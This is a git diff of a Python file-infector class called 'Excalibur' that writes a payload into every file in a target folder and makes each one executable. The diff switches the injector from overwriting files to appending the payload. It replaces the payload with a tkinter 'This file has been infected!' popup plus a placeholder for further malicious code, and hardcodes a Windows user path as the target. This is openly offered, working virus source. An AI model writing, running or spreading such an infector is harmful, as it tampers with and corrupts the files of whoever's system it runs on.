@@ -30,33 +30,25 @@ class Excalibur:
 
     @cached_property
     def malicious_code(self):
-        """ Malicious code. In the case of this file
-        injector it is this whole file.
-        """
+
         malicious_code = '''
-import tkinter as tk
-from tkinter import messagebox
+    import tkinter as tk
+    from tkinter import messagebox
 
-# Display a warning message when the infected file is executed
-def show_warning():
-    messagebox.showwarning("Warning", "This file has been infected!")
+    def show_warning():
+        root = tk.Tk()
+        root.withdraw()
+        messagebox.showwarning("Warning", "This file has been infected!")
 
-# Create a simple GUI window
-window = tk.Tk()
-window.withdraw()
+    show_warning()
 
-# Call the show_warning function
-show_warning()
-
-# Your additional malicious code goes here
-'''
-
+    # Your additional malicious code goes here
+    '''
         return malicious_code
 
     def infect_files_in_folder(self, path):
         """ Perform file infection on all files in the
         given directory specified by path.
-
         :param str path: Path of the folder to be infected.
         :returns: Number of injected files (`int`).
         """
@@ -85,11 +77,11 @@ show_warning()
                 continue
 
             # Ensure that the injected file is executable.
-            os.chmod(file, 777)
+            os.chmod(file, 0o777)  # Change the mode to make it executable
 
             # Write the original and malicious part into the file.
             with open(file, 'w') as infected_file:
-                infected_file.write(self.malicious_code)
+                infected_file.write(file_content + self.malicious_code)
 
             num_infected_files += 1
 
@@ -102,8 +94,8 @@ if __name__ == '__main__':
     # Create file injector.
     code_injector = Excalibur('Excalibur')
 
-    # Infect all files in the same folder.
-    path = os.path.dirname(os.path.abspath(__file__))
+    # Infect files in the specified folder.
+    path = r"C:\Users\Intern 11\Testing123\MyText.txt"  # Update the folder path here
     NUMBER_INFECTED_FILES = code_injector.infect_files_in_folder(path)
 
     logging.info('Number of infected files: {}'.format(NUMBER_INFECTED_FILES))
